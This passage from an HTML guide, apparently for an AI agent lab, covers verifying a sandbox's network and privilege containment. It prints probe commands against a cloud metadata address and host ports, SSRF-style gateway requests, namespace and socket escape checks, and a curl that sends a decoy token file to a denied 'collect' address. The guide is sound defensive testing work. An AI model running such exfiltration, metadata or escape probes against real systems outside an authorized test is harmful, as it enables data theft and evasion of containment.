+  http://169.254.169.254/
+
+ip route get 169.254.169.254</code></pre>
+
+        <p><strong>Expected:</strong> no response and a logged denial if a route is attempted. The node should also have no workload identity capable of issuing credentials. Do not add cloud-specific metadata headers or credential paths; proving the network boundary does not require requesting sensitive material.</p>
+
+        <h3>9.8 Host and bridge addresses</h3>
+
+        <p>Resolve the bridge gateway from the network inspection, then test representative host ports that are known to be closed or protected:</p>
+
+        <pre><code>curl --noproxy '*' \
+  --connect-timeout 2 \
+  --max-time 4 \
+  http://172.30.0.1:8080/
+
+python - &lt;&lt;'PY'
+import socket
+for port in (22, 2375, 2376, 6443, 10250):
+    sock = socket.socket()
+    sock.settimeout(1)
+    try:
+        sock.connect(("172.30.0.1", port))
+        print(port, "UNEXPECTED_CONNECT")
+    except OSError as exc:
+        print(port, type(exc).__name__)
+    finally:
+        sock.close()
+PY</code></pre>
+
+        <p><strong>Expected:</strong> all attempts denied by the host-input policy. Do not infer safety from “connection refused”; refusal proves the port was closed at that moment, not that the sandbox is prohibited from reaching host services.</p>
+
+        <h3>9.9 Alternate protocol and port checks</h3>
+
+        <p>Test UDP as well as TCP. A small Python probe avoids dependence on optional utilities:</p>
+
+        <pre><code>python - &lt;&lt;'PY'
+import socket
+targets = [
+    ("192.0.2.70", 53),
+    ("198.51.100.70", 123),
+    ("203.0.113.70", 443),
+]
+for host, port in targets:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(1)
+    try:
+        sock.sendto(b"AGENTLAB_UDP_TEST", (host, port))
+        try:
+            data, peer = sock.recvfrom(512)
+            print(host, port, "UNEXPECTED_RESPONSE", peer, len(data))
+        except socket.timeout:
+            print(host, port, "NO_RESPONSE")
+    finally:
+        sock.close()
+PY</code></pre>
+
+        <p><strong>Expected:</strong> no responses and increments in the deny counter. Because UDP clients may report a successful local send even when the packet is later dropped, client exit status is not sufficient evidence; the firewall observation is decisive.</p>
+
+        <h3>9.10 Decoy read and attempted transmission</h3>
+
+        <p>First read the synthetic fixture under controlled conditions to verify that file monitoring works:</p>
+
+        <pre><code>test -r /fixtures/decoy-token
+wc -c &lt; /fixtures/decoy-token</code></pre>
+
+        <p><strong>Expected:</strong> a host file-access event linked to the sandbox identity. The command avoids printing the value.</p>
+
+        <p>Next, attempt to send a known test marker—not a real secret—to a denied documentation address:</p>
+
+        <pre><code>curl --noproxy '*' \
+  --connect-timeout 2 \
+  --max-time 4 \
+  -H 'X-AgentLab-Test: decoy-transmission-attempt' \
+  --data-binary @/fixtures/decoy-token \
+  http://192.0.2.80/collect</code></pre>
+
+        <p><strong>Expected:</strong> a decoy read event and a firewall denial, with no gateway event. The firewall usually cannot see the HTTP header or body because the connection never completes; correlation relies on the test ID, process observation, and timing.</p>
+
+        <p>Finally, send a non-secret marker to the approved gateway:</p>
+
+        <pre><code>curl --noproxy '*' \
+  --connect-timeout 2 \
+  --max-time 4 \
+  -H "X-AgentLab-Run: $RUN_ID" \
+  -H 'X-AgentLab-Test: approved-observation-path' \
+  --data 'synthetic-observation-marker' \
+  http://172.30.0.10:8080/observe</code></pre>
+
+        <p><strong>Expected:</strong> success and a gateway record. This proves the detector sees relevant traffic when it traverses the one approved path.</p>
+
+        <h3>9.11 Namespace, route, and interface changes</h3>
+
+        <pre><code>unshare --user --map-root-user --net true
+ip link add agentlab-dummy type dummy
+ip route add 192.0.2.0/24 via 172.30.0.1
+mount -t tmpfs tmpfs /mnt</code></pre>
+
+        <p><strong>Expected:</strong> all operations fail under the selected runtime and security profile. Exact error text varies. If user namespaces are intentionally available for application compatibility, document that exception and prove that nested networking still cannot acquire an external interface or alter host enforcement.</p>
+
+        <h3>9.12 Privilege and process-boundary checks</h3>
+
+        <pre><code>id
+grep -E '^(Cap|NoNewPrivs|Seccomp):' /proc/self/status
+test ! -S /var/run/docker.sock
+test ! -S /run/containerd/containerd.sock
+find /proc/1/root -maxdepth 1 -print 2&gt;/dev/null
+ls -la /proc/1/fd 2&gt;/dev/null</code></pre>
+
+        <p><strong>Expected:</strong> non-root identity, empty effective capabilities, <code>NoNewPrivs</code> enabled, the expected seccomp mode, no runtime sockets, and no unexpected access to a host process filesystem.</p>
+
+        <h3>9.13 Redirect and parser checks on the approved gateway</h3>
+
+        <p>If the production design permits an application gateway, test its interpretation boundaries. The gateway should not accept an arbitrary URL parameter, <code>Host</code> override, CONNECT tunnel, or redirect destination and then fetch it. This class of weakness can become <a href="glossary.html#ssrf">server-side request forgery</a>.</p>
+
+        <p>For the non-forwarding fixture in this guide, send representative inputs and verify that it only returns the fixed response:</p>
+
+        <pre><code>curl --noproxy '*' \
+  --max-time 4 \
+  -H 'Host: 169.254.169.254' \
+  'http://172.30.0.10:8080/fetch?url=http://192.0.2.90/'
+
+curl --noproxy '*' \
+  --max-time 4 \
+  -X CONNECT \
+  'http://172.30.0.10:8080/192.0.2.90:443'</code></pre>
+
+        <p><strong>Expected:</strong> no secondary connection and no forwarding behavior. The fixture may return its fixed response or reject the method. Confirm using firewall counters and gateway logs, not only the client response.</p>
+
+        <h3>9.14 Resource-exhaustion checks</h3>
+
+        <p>Containment also depends on the sandbox being unable to disable monitoring through resource exhaustion. Run bounded tests only:</p>
+
+        <pre><code>ulimit -a
+cat /sys/fs/cgroup/memory.max 2&gt;/dev/null
+cat /sys/fs/cgroup/pids.max 2&gt;/dev/null
+cat /sys/fs/cgroup/cpu.max 2&gt;/dev/null
+
+python - &lt;&lt;'PY'
+import subprocess
+children = []
+for _ in range(300):
+    try:
+        children.append(subprocess.Popen(["true"]))
+    except OSError as exc:
+        print("LIMIT_REACHED", type(exc).__name__, str(exc))
+        break
+for child in children:
+    child.wait()
+print("started", len(children))
+PY</code></pre>
+
+        <p><strong>Expected:</strong> the configured process limit is enforced without harming the host logger or gateway. Avoid unbounded fork bombs, disk-filling loops, or memory bombs; they add operational risk without improving the conclusion.</p>
+      </section>
+
+      <section id="verification">
+        <h2>10. Verify the result</h2>
+
+        <p>Evaluate each test against a predeclared oracle. Do not mark a test as passed merely because the command returned non-zero.</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Test class</th>
+              <th>Client evidence</th>
+              <th>Independent evidence</th>
+              <th>Pass condition</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Approved flow</td>
+              <td>HTTP 200</td>
+              <td>Gateway event and allow counter</td>
+              <td>All present and correlated</td>
+            </tr>
+            <tr>
+              <td>Denied TCP</td>
+              <td>Connection failure</td>
+              <td>Drop event or counter increment</td>
+              <td>Destination and test window match</td>
+            </tr>
+            <tr>
+              <td>Denied UDP</td>
+              <td>No response</td>
+              <td>Drop counter increment</td>
+              <td>Packet observed and denied</td>
+            </tr>
+            <tr>
+              <td>DNS</td>
+              <td>No result</td>
+              <td>Port-53 denial or controlled resolver rejection</td>
+              <td>No uncontrolled resolver receives query</td>
+            </tr>
+            <tr>
+              <td>Decoy read</td>
+              <td>Controlled read completes</td>
+              <td>File-access event</td>
+              <td>Event identifies sandbox process</td>
+            </tr>
+            <tr>
+              <td>Decoy transmission attempt</td>
+              <td>Request fails</td>
+              <td>Read event plus network denial</td>
+              <td>No approved-gateway receipt</td>
+            </tr>
+            <tr>
+              <td>Privilege boundary</td>
+              <td>Operation denied</td>
+              <td>Runtime policy and process state</td>
+              <td>No capability or socket bypass exists</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h3>Verification procedure</h3>
+
+        <ol>
+          <li>Record the start timestamp, run identifier, image digest, runtime version, kernel version, network inspection, and firewall ruleset.</li>
+          <li>Capture baseline firewall counters.</li>
+          <li>Run the approved positive control.</li>
+          <li>Run one negative test at a time during manual validation.</li>
+          <li>Match client, firewall, DNS, gateway, and file-audit events by timestamp and test ID.</li>
+          <li>Capture final counters.</li>
+          <li>Verify that no unexpected gateway requests occurred.</li>
+          <li>Verify that the sandbox cannot alter or delete authoritative logs.</li>
+          <li>Restart the sandbox and repeat a representative subset to detect state-dependent behavior.</li>
+          <li>Restart the host and confirm that the intended policy persists before relying on the bench for regression testing.</li>
+        </ol>
+
+        <h3>Automated assertion model</h3>
+
+        <pre><code>PASS if:
+  positive_control.client_status == 0
+  and positive_control.gateway_matches == 1
+  and positive_control.deny_matches == 0
+
+PASS denied_flow if:
+  denied_flow.client_status != 0
+  and denied_flow.firewall_drop_delta &gt;= 1
+  and denied_flow.gateway_matches == 0
+
+PASS decoy_attempt if:
+  decoy_attempt.file_read_matches &gt;= 1
+  and decoy_attempt.firewall_drop_delta &gt;= 1
+  and decoy_attempt.gateway_decoy_matches == 0
+
+FAIL CLOSED if:
+  any evidence source is unavailable
+  or event timestamps cannot be correlated
+  or the expected policy cannot be identified</code></pre>
+
+        <p>“Fail closed” in the evaluator means an incomplete observation cannot produce a green report. It does not mean every workload operation must be blocked.</p>
+
+        <h3>Test report fields</h3>
+
+        <ul>
+          <li>Run ID and UTC interval.</li>
+          <li>Operator and authorization reference.</li>
+          <li>Host, kernel, runtime, and image digests.</li>
+          <li>Effective sandbox flags and security profiles.</li>
+          <li>Network topology and exact firewall rules.</li>
+          <li>Expected and observed result for every test.</li>
+          <li>Raw-log locations and retention period.</li>
+          <li>Unexpected flows, missing evidence, and accepted exceptions.</li>
+          <li>Remediation owner and retest requirement.</li>
+        </ul>
+      </section>
+
+      <section id="failures">
+        <h2>11. Failure cases and remediation</h2>
+
+        <h3>The direct request fails, but no firewall event exists</h3>
+
+        <p>The destination may be unrouted, the command may have failed before opening a socket, or the packet may have traversed another interface. Confirm the destination, inspect routes, capture rule counters, and temporarily use host-side packet observation scoped to the test bridge. Do not claim enforcement until the responsible control is identified.</p>
+
+        <h3>The package manager reaches a different address</h3>
+
+        <p>A mirror, proxy, global configuration, credential helper, or registry override is active. Inspect configuration origins and the sanitized launch environment. Rebuild from a minimal image if the source cannot be explained. Package tools should not receive broader network authority than the agent.</p>
+
+        <h3>DNS queries leave even though TCP is blocked</h3>
+
+        <p>The policy omitted UDP/TCP 53, the runtime injected a resolver, or the host resolver is reachable through a special path. Remove unnecessary resolver configuration or direct all queries to a controlled resolver with an explicit policy. Check IPv6 DNS servers as well.</p>
+
+        <h3>The sandbox reaches the host bridge address</h3>
+
+        <p>The forwarding chain does not govern traffic destined for the host. Add an input-chain policy scoped to the sandbox bridge and source. Confirm that host services bind only where needed and require authentication independently of network placement.</p>
+
+        <h3>The approved gateway can reach the internet</h3>
+
+        <p>The gateway is attached to an additional network or the host forwards its traffic. Remove the second attachment and add a gateway-specific outbound policy. An approved gateway that can fetch arbitrary destinations is not a narrow exception; it is an egress relay.</p>
+
+        <h3>A proxy accepts unrestricted CONNECT requests</h3>
+
+        <p>Restrict destination identities, ports, methods, address classes, redirects, and name resolution. Prefer application-specific operations over generic tunnels. Authenticate the sandbox workload independently so one environment cannot borrow another environment’s policy.</p>
+
+        <h3>A decoy appears in gateway logs</h3>
+
+        <p>Treat the event as evidence that the workload accessed and attempted to move protected-looking data through an approved channel. The network allowlist worked as configured, but the application-layer policy was insufficient. Add outbound request schemas, header filtering, body-size limits, secret scanning where appropriate, and operation-specific authorization. Rotate the synthetic fixture anyway so subsequent tests remain distinguishable.</p>
+
+        <h3>The decoy was read, but no access event exists</h3>
+
+        <p>The audit path may reference the wrong host inode, the bind mount may obscure the watched object, or the observer may not cover the relevant syscall. Verify with a controlled read from the exact sandbox mount and correlate device/inode identities. Monitoring must be tested like any other security control.</p>
+
+        <h3>The agent can create a nested network namespace</h3>
+
+        <p>Review user-namespace policy, capabilities, seccomp configuration, and runtime flags. A nested namespace does not automatically grant connectivity, but it expands attack surface and complicates observation. Deny it unless the workload has a documented requirement.</p>
+
+        <h3>The container can inspect or control sibling processes</h3>
+
+        <p>Check PID namespace configuration, procfs mounts, ptrace permissions, shared volumes, runtime sockets, and excessive capabilities. Network restrictions cannot contain a workload that can commandeer a better-connected sibling.</p>
+
+        <h3>Rules disappear after restart</h3>
+
+        <p>The test used an ephemeral runtime rule rather than the host’s managed firewall configuration. Integrate the policy with the system service or orchestration control plane, test boot ordering, and rerun the full suite after reboot.</p>
+
+        <h3>Everything is blocked, including the positive control</h3>
+
+        <p>Inspect bridge identity, rule order, address assignment, gateway listener, and return traffic. Keep the positive control first in the suite. A total outage is not proof of correct selective containment.</p>
+
+        <h3>Logs contain complete tokens or request bodies</h3>
+
+        <p>Reduce collection to presence flags, digests, lengths, test identifiers, and selected non-sensitive metadata. Restrict access and retention for already collected logs. Observability must not become a new secret-distribution channel.</p>
+      </section>
+
+      <section id="limitations">
+        <h2>12. Limitations</h2>
+
+        <p>This test bench provides strong evidence about a defined configuration at a defined time. It does not prove universal isolation.</p>
+
+        <ul>
+          <li><strong>Kernel vulnerabilities:</strong> a container shares the host kernel. A previously unknown or unpatched kernel flaw may cross the boundary. Higher-risk workloads may require a microVM or dedicated VM.</li>
+          <li><strong>Runtime vulnerabilities:</strong> container engine, shim, image parser, and orchestration defects remain possible. Patch and minimize these components.</li>
+          <li><strong>Allowed-channel leakage:</strong> any approved service can carry data unless application-layer policy constrains methods, fields, sizes, and destinations.</li>
+          <li><strong>Side channels:</strong> timing, resource contention, shared caches, and other covert channels are not comprehensively tested here.</li>
+          <li><strong>Supply-chain behavior:</strong> dependency installation may execute code. Network denial limits communication but does not make hostile code safe.</li>
+          <li><strong>Local persistence:</strong> data written to reused volumes may survive and be transmitted by a later, better-connected job.</li>
+          <li><strong>Observation gaps:</strong> sampling, rate limits, dropped logs, clock drift, or collector failure may hide events.</li>
+          <li><strong>Protocol evolution:</strong> new runtimes and tools may add alternate transports, helpers, or proxy behavior. Maintain the suite as a regression control.</li>
+          <li><strong>Human exceptions:</strong> emergency allow rules and debugging mounts often outlive the incident that created them. Make exceptions time-bound and automatically retested.</li>
+        </ul>
+
+        <p>For high-risk agent execution, combine the network policy with ephemeral workloads, verified images, signed configuration, read-only inputs, minimal tools, dedicated identities, short-lived credentials, strict output review, resource quotas, and rapid teardown.</p>
+      </section>
+
+      <section id="checklist">
+        <h2>13. Repeatable checklist</h2>
+
+        <h3>Before the run</h3>
+
+        <ul class="checklist">
+          <li>Use a dedicated disposable host or VM.</li>
+          <li>Remove production credentials and workload identities.</li>
+          <li>Record kernel, runtime, image, and policy versions.</li>
+          <li>Create a private internal network.</li>
+          <li>Start a non-forwarding approved gateway.</li>
+          <li>Run the sandbox as non-root with no capabilities.</li>
+          <li>Enable read-only root, limited temporary storage, PID, CPU, and memory limits.</li>
+          <li>Verify that runtime sockets and host directories are absent.</li>
+          <li>Load host-level input and forwarding policies.</li>
+          <li>Cover both IPv4 and IPv6 explicitly.</li>
+          <li>Disable DNS or configure a controlled resolver.</li>
+          <li>Sanitize proxy and package-manager configuration.</li>
+          <li>Generate unique synthetic decoys.</li>
+          <li>Start firewall, gateway, DNS, and file-access logging.</li>
+        </ul>
+
+        <h3>During the run</h3>
+
+        <ul class="checklist">
+          <li>Run the approved positive control first.</li>
+          <li>Test direct TCP, UDP, IPv4, and IPv6.</li>
+          <li>Test DNS and alternate resolvers.</li>
+          <li>Inject explicit proxy variables and confirm denial.</li>
+          <li>Exercise package-manager and version-control network paths.</li>
+          <li>Test loopback, private, link-local, metadata, bridge, and host destinations.</li>
+          <li>Verify decoy reads and denied transmission attempts.</li>
+          <li>Test namespace, mount, route, interface, and privilege operations.</li>
+          <li>Verify that the gateway cannot be used as a generic proxy.</li>
+          <li>Correlate every result with independent evidence.</li>
+        </ul>
+
+        <h3>After the run</h3>
+
+        <ul class="checklist">
+          <li>Capture final firewall counters and effective rules.</li>
+          <li>Search for unexpected gateway, DNS, and decoy events.</li>
+          <li>Mark missing evidence as a failure, not as “not observed.”</li>
+          <li>Document exceptions, owners, and retest dates.</li>
+          <li>Rotate or destroy all synthetic fixtures.</li>
+          <li>Remove the disposable environment using the approved teardown process.</li>
+          <li>Repeat after kernel, runtime, image, network, proxy, or orchestration changes.</li>
+        </ul>
+
+        <h3>Expected final state</h3>
+
+        <p>The finished stand has one demonstrably functional application path, no arbitrary outbound route, no uncontrolled resolver, no inherited proxy escape, no cloud or runtime credentials, and no host-control socket. Synthetic tokens produce observable read events. Attempts to send them to denied destinations produce host-level network evidence, while the authoritative logs remain outside the sandbox’s control.</p>
+      </section>
+
+      <footer class="article-footer">
+        <p>Continue with more repeatable implementation material in <a href="guides.html">Agent Lab Journal guides</a>, or review security and agent-engineering terminology in the <a href="glossary.html">glossary</a>.</p>
+      </footer>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <p>&copy; Agent Lab Journal</p>
+    </div>
+  </footer>
+</body>
+</html>
